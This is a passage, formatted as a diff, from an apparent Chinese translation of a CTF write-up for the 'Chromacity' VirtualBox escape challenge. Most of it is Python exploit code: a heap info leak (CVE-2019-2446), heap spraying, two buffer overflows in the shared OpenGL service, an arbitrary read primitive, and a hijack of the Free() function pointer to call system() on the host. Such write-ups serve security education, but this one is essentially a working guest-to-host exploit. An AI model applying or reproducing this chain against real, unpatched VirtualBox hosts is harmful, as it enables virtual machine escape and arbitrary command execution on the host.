@@ -1,0 +1,104 @@
+    msg = make_oob_read(OFFSET_CONN_CLIENT)
+    leak = crmsg(client, msg, 0x290)[16:24]
+有趣的是，这是由于一个未初始化的内存错误造成的。也就是说，svcGetBuffer()方法请求堆内存来存储来自guest的消息。然而，它没有清除缓冲区。因此，任何返回消息缓冲区数据的API都可能被滥用，从而向guest泄露堆的有价值信息。我假设Niklas知道这个漏洞，所以我决定用它来解决这个挑战。事实上，在比赛后的几个星期，这个错误的补丁被修补并分配为[CVE-2019-2446](https://www.zerodayinitiative.com/advisories/ZDI-19-046/
+"CVE-2019-2446")。
+# 堆喷射
+我们可以使用alloc_buf()将CRVBOXSVCBUFFER_t喷射到堆上，如下所示:
+    bufs = []
+    for i in range(spray_num):
+        bufs.append(alloc_buf(self.client, spray_len))
+从经验上讲，我发现通过选择`spray_len = 0x30`和`spray_num =
+0x2000`，它们的缓冲区最终将是连续的，并且pData指向的缓冲区与另一个CRVBOXSVCBUFFER_t相邻。
+这是通过将命令`SHCRGL_GUEST_FN_WRITE_READ_BUFFERED`发送到HOST来实现的，其中`hole_pos =
+spray_num - 0x10`：
+    hgcm_call(self.client, SHCRGL_GUEST_FN_WRITE_READ_BUFFERED, [bufs[hole_pos], "A" * 0x1000, 1337])
+在src/VBox/HostServices/SharedOpenGL/crserver/crservice.cpp上查看此命令的实现
+# 第一次溢出
+既然我们已经仔细地设置了好了堆，我们就可以分配消息缓冲区并触发溢出，如下所示：
+    msg = (pack("<III", CR_MESSAGE_OPCODES, 0x41414141, 1)
+            + '\0\0\0' + chr(CR_EXTEND_OPCODE)
+            + 'aaaa'
+            + pack("<I", CR_SHADERSOURCE_EXTEND_OPCODE)
+            + pack("<I", 0)    # shader
+            + pack("<I", 1)    # count
+            + pack("<I", 0)    # hasNonLocalLen
+            + pack("<I", 0x22) # pLocalLength[0]
+            )
+    crmsg(self.client, msg, spray_len)
+请注意，我们发送的消息的大小与刚刚释放的消息大小完全相同。由于glibc堆的工作方式，它可能会占用完全相同的位置。此外，请注意`count=1`，并记住只有最后一个长度可以任意大。由于只有一个元素，显然第一个元素也是最后一个元素。  
+最后，让`pLocalLength[0] = 0x22`。这个值足够小，只会损坏ID和大小字段(我们不想损坏pData)。  
+这是怎么算出来的？  
+我们的消息是0x30字节长。  
+pString的偏移量为0x28。  
+glibc块标头(64位)为0x10字节宽。  
+uiId和uiSize都是32位无符号整数。  
+pLocalLength[0]在crUnPackExtenShaderSource()中减去2  
+因此，我们需要`0x30-0x28=8`个字节才能到达消息的末尾，`0x10`个字节才能遍历块标头，还有`8`个字节才能覆盖`uiId`和`uiSize`。由于减法，我们必须再加2个字节。总的来说，这等于0x22字节。
+# Finding the corruption
+回想一下，size字段是一个32位无符号整数，我们选择的size是0x30字节。因此，在损坏之后，这个字段将保存值0x0a0a0a30(三个零字节已被字节0x0a替换)。  
+找到损坏的ID稍微复杂一些，需要我们遍历ID列表以找出其中哪一个丢失了。为此，我们向每个ID发送一条`SHCRGL_GUEST_FN_WRITE_BUFFER`消息，如下所示：
+    print("[*] Finding corrupted buffer...")
+    found = -1
+    for i in range(spray_num):
+        if i != hole_pos:
+            try:
+                hgcm_call(self.client, SHCRGL_GUEST_FN_WRITE_BUFFER, [bufs[i], spray_len, 0, ""])
+            except IOError:
+                print("[+] Found corrupted id: 0x%x" % bufs[i])
+                found = bufs[i]
+                break
+    if found < 0:
+        exit("[-] Error could not find corrupted buffer.")
+最后，我们手动将每个\0替换为一个\n字节，以匹配损坏的缓冲区的ID(请原谅我的python技巧)：
+    id_str = "%08x" % found
+    new_id = int(id_str.replace("00", "0a"), 16)
+    print("[+] New id: 0x%x" % new_id)
+现在我们拥有了制造第二次溢出所需的一切，我们终于可以控制它的内容了。我们的最终目标是覆盖pData字段，并使其指向我们之前泄漏的
+`CRConnection`对象。
+# 第二次溢出
+使用`new_id`和size`0x0a0a0a30`，我们现在将破坏第二个CRVBOXSVCBUFFER_t。与上一次溢出类似，这是因为这些缓冲区彼此相邻。但是，这一次我们用ID为0x13371337、大小为0x290和指向self.pConn的伪对象覆盖它。
+    try:
+        fake = pack("<IIQQQ", 0x13371337, 0x290, self.pConn, 0, 0)
+        hgcm_call(self.client, SHCRGL_GUEST_FN_WRITE_BUFFER, [new_id, 0x0a0a0a30, spray_len + 0x10, fake])
+        print("[+] Exploit successful.")
+    except IOError:
+        exit("[-] Exploit failed.")
+请注意，`spray_len +
+0x10`表示偏移量(同样，我们跳过块标头的0x10字节)。这样做之后，我们可以任意修改`CRConnection`对象的内容。如前所述，这最终使我们能够任意读取原语，并允许我们通过替换Free()函数指针来调用任何需要的函数。
+# 任意读原语
+发出`SHCRGL_GUEST_FN_READ`命令时，来自pHostBuffer的数据将发送回guest。使用自定义的 `0x13371337
+ID`，我们可以用自定义指针覆盖此指针及其相应的大小。然后，我们使用`self.client2`客户端发送`SHCRGL_GUEST_FN_READ`消息以触发任意读取(这是泄漏的CRConnection的客户端ID)：
+    hgcm_call(self.client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0x13371337, 0x290, OFFSET_CONN_HOSTBUF,   pack("<Q", where)])
+    hgcm_call(self.client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0x13371337, 0x290, OFFSET_CONN_HOSTBUFSZ, pack("<I", n)])
+    res, sz = hgcm_call(self.client2, SHCRGL_GUEST_FN_READ, ["A"*0x1000, 0x1000])
+# 任意代码执行
+每个`CRConnection`对象都有函数指针`alloc()`、`Free()`等。存储guest的消息缓冲区。此外，它们将CRConnection对象本身作为第一个参数。它可以用来启动一个ROP链，例如，或者简单地使用任意命令调用system()。  
+为此，我们覆盖`OFFSET_CONN_FREE`处的指针和偏移量0处所需参数的内容，如下所示：
+    hgcm_call(self.client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0x13371337, 0x290, OFFSET_CONN_FREE, pack("<Q", at)])
+    hgcm_call(self.client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0x13371337, 0x290, 0, cmd])
+触发Free()非常简单，只需要我们使用self.client2向主机发送任何有效的消息。
+# 寻找system()
+我们已经知道一个地址，即`crVBoxHGCMFree()`。它是存储在Free()字段中的函数指针。此子例程位于模块`VBoxOGLhostcrutil`中，该模块还包含libc的其他stubs。因此，我们可以很容易地计算`system()`的地址。
+    self.crVBoxHGCMFree = self.read64(self.pConn + OFFSET_CONN_FREE)
+    print("[+] crVBoxHGCMFree: 0x%x" % self.crVBoxHGCMFree)
+    self.VBoxOGLhostcrutil = self.crVBoxHGCMFree - 0x20650
+    print("[+] VBoxOGLhostcrutil: 0x%x" % self.VBoxOGLhostcrutil)
+    self.memset = self.read64(self.VBoxOGLhostcrutil + 0x22e070)
+    print("[+] memset: 0x%x" % self.memset)
+    self.libc = self.memset - 0x18ef50
+    print("[+] libc: 0x%x" % self.libc)
+    self.system = self.libc + 0x4f440
+    print("[+] system: 0x%x" % self.system)
+# 获得flag
+在这一点上，我们距离捕获flag只有一步之遥。该flag存储在`~/Desktop/Flag.txt`的文本文件中。我们可以通过使用任何文本编辑器或终端打开文件来查看其内容。  
+在第一次提交期间出现的一个小问题是，它使系统崩溃。我很快意识到我们不能使用超过16个字节的字符串，因为有些指针位于这个偏移量。用无效内容覆盖它将导致分段错误。因此，我用了一个小技巧，将文件路径缩短了两次，这样就可以用更少的字符打开它：
+    p.rip(p.system, "mv Desktop a\0")
+    p.rip(p.system, "mv a/flag.txt b\0")
+    p.rip(p.system, "mousepad b\0")
+4-5小时后，我就能获得flag了，我很兴奋能第一个解决这个难题.
+# 结论
+如果您以前一直在处理这个难题，那么解决它并不是一件很难的事情。据我所知，在没有任何infoleak的情况下，可以通过建立一个更好的heap
+constellation 来解决这个问题，在这个constellation
+中，我们可以直接溢出到CRConnection对象中，并修改cbHostBuffer字段，最后导致越界读取原语。  
+感谢阅读！
+    原文：https://theofficialflow.github.io/2019/04/26/chromacity.html
